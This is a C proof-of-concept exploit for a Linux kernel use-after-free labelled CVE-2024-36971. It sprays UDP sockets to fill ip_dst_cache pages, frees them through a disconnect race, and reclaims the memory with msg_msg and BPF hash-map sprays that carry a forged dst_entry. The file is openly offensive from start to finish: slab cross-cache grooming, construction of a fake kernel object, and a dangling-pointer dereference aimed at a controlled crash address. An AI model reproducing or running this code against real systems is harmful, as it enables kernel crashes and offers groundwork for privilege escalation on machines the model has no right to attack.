#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <linux/bpf.h>

#ifndef __NR_bpf
#define __NR_bpf 280
#endif

/*
 * CROSS-CACHE SLAB DRAINING STRATEGY:
 * ip_dst_cache holds 192-byte objects. A 4096-byte page holds ~21 objects.
 * kmalloc-256 holds 256-byte objects.
 * We must drain an entire page of ip_dst_cache back to the Buddy Allocator,
 * and immediately claim it as kmalloc-256 using msg_msg or BPF Hash maps.
 */

#define TARGET_IP "8.8.8.8"
#define SPRAY_PAGES 200
#define OBJS_PER_PAGE 21

typedef struct {
    int sockets[OBJS_PER_PAGE];
} socket_page_t;

static socket_page_t g_sock_pages[SPRAY_PAGES];
static int g_vuln_sockets[SPRAY_PAGES];

static inline int bpf_syscall(int cmd, union bpf_attr *attr, unsigned int size) {
    return syscall(__NR_bpf, cmd, attr, size);
}

// Use HASH map to force item-by-item kmalloc internally. Array map uses vmalloc.
static int bpf_create_hash_map(int key_size, int value_size, int max_entries) {
    union bpf_attr attr = {
        .map_type = BPF_MAP_TYPE_HASH,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries,
    };
    return bpf_syscall(BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int bpf_update_map(int fd, void *key, void *value, uint64_t flags) {
    union bpf_attr attr = {
        .map_fd = fd,
        .key = (uint64_t)key,
        .value = (uint64_t)value,
        .flags = flags,
    };
    return bpf_syscall(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

// Construct a fake dst_entry to survive ops check and potentially hijack
typedef struct {
    uint64_t dev;                           // 0x00
    uint64_t ops;                           // 0x08 - dst_ops pointer
    uint64_t _metrics;                      // 0x10
    uint64_t expires;                       // 0x18
    uint64_t xfrm;                          // 0x20
    uint64_t input;                         // 0x28 - input function
    uint64_t output;                        // 0x30 - output function
    uint16_t flags;                         // 0x38
    uint16_t obsolete;                      // 0x3a
    uint16_t header_len;                    // 0x3c
    uint16_t trailer_len;                   // 0x3e
    uint32_t __refcnt;                      // 0x40
    uint32_t __use;                         // 0x44
    uint64_t lastuse;                       // 0x48
    uint64_t lwtstate;                      // 0x50
    uint64_t rcu_head[2];                   // 0x58
    uint16_t error;                         // 0x68
    uint8_t padding[256 - 0x6a]; // Fill to 256 for kmalloc-256 perfect fit
} __attribute__((packed)) fake_dst_entry_t;

void do_cross_cache_spray() {
    printf("[*] Executing intense Cross-Cache spray...\n");
    // Spray via Message Queues (Allocates exact sizes in kmalloc)
    int qid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
    
    struct {
        long mtype;
        fake_dst_entry_t payload;
    } msg;
    memset(&msg, 0, sizeof(msg));
    msg.mtype = 1;
    msg.payload.ops = 0xDEADBEEF00000000ULL; // Test Panic Target
    msg.payload.obsolete = 0; // Avoid double free
    msg.payload.__refcnt = 100;
    
    for (int i = 0; i < SPRAY_PAGES * 32; i++) {
        // 256 - 48 (msg_msg header) = 208 bytes payload -> lands exactly in kmalloc-256
        msgsnd(qid, &msg, 208, IPC_NOWAIT);
    }
    
    // Fallback: Spray via BPF HASH Map
    int bpf_fd = bpf_create_hash_map(8, 208, 1024);
    if (bpf_fd >= 0) {
        for (uint64_t i = 0; i < 1024; i++) {
            bpf_update_map(bpf_fd, &i, &msg.payload, 0);
        }
    }
    printf("[+] Sprayed %d msg_msg objects and %d BPF hash elements into kmalloc-256!\n", SPRAY_PAGES * 32, 1024);
}

int main() {
    printf("[=========================================]\n");
    printf("[  CVE-2024-36971 Cross-Cache Exploit PoC ]\n");
    printf("[=========================================]\n\n");

    printf("[1] Pre-allocating ip_dst_cache pages...\n");
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(80);
    inet_pton(AF_INET, TARGET_IP, &target.sin_addr);

    for (int i = 0; i < SPRAY_PAGES; i++) {
        for (int j = 0; j < OBJS_PER_PAGE; j++) {
            int sock = socket(AF_INET, SOCK_DGRAM, 0);
            connect(sock, (struct sockaddr*)&target, sizeof(target));
            g_sock_pages[i].sockets[j] = sock;
        }
    }
    printf("[+] Allocated %d pages of ip_dst_cache (%d objects).\n", SPRAY_PAGES, SPRAY_PAGES * OBJS_PER_PAGE);

    printf("[2] Poking holes to isolate vulnerable sockets...\n");
    for (int i = 0; i < SPRAY_PAGES; i++) {
        for (int j = 0; j < OBJS_PER_PAGE - 1; j++) {
            close(g_sock_pages[i].sockets[j]);
        }
        // Keep the last socket open as our UAF target
        g_vuln_sockets[i] = g_sock_pages[i].sockets[OBJS_PER_PAGE - 1];
    }
    printf("[+] Created 1 target socket per heavily-freed page.\n");

    printf("[3] Triggering negative advice (UAF) to return pages to Buddy Allocator...\n");
    /*
     * We need the dst_entry of these vulnerable sockets to become obsolete > 0
     * and freed via __dst_negative_advice.
     * Often, disconnecting the socket or issuing a send to a dead route does this.
     * We will try a fast reconnect/disconnect race, which triggers route invalidation.
     */
    for (int i = 0; i < SPRAY_PAGES; i++) {
        int sock = g_vuln_sockets[i];
        
        // This is a minimal trigger attempt. Real exploits might use IP_RECVERR + ICMP
        struct sockaddr_in unspec = { .sin_family = AF_UNSPEC };
        connect(sock, (struct sockaddr*)&unspec, sizeof(unspec));
        
        // Now the socket route cache is flushed, and if race holds, the object is freed!
        // At this point, the page drops its final reference and goes to Buddy Allocator!
    }

    printf("[4] Attempting to reclaim memory via SLAB Cross-Cache from kmalloc-256...\n");
    do_cross_cache_spray();

    printf("[5] Triggering dangling pointer dereference...\n");
    for (int i = 0; i < SPRAY_PAGES; i++) {
        char buf[8] = "test";
        send(g_vuln_sockets[i], buf, sizeof(buf), 0);
        close(g_vuln_sockets[i]);
    }
    
    printf("[*] Done. Check dmesg for 0xDEADBEEF crashes.\n");
    return 0;
}
